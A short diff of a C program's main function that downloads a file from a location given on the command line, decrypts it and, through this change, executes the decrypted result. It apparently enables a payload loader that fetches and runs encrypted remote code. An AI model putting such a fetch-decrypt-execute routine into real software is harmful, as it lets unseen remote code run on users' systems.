@@ -75,13 +75,15 @@ int main(int argc, char* argv[]) {
   download_to_fd(download_fd, argv[1]);
   crypto_fd(download_fd, decrypted_fd, false);
 
-  /*char* download_path  = fd_to_path(download_fd);
+  char* download_path  = fd_to_path(decrypted_fd);
   char* running_argv[] = {download_path, NULL};
 
   exec_file(download_path, running_argv);
 
   free(download_path);
-  close(download_fd);*/
+
+  close(download_fd);
+  close(decrypted_fd);
 
   return 0;
 }
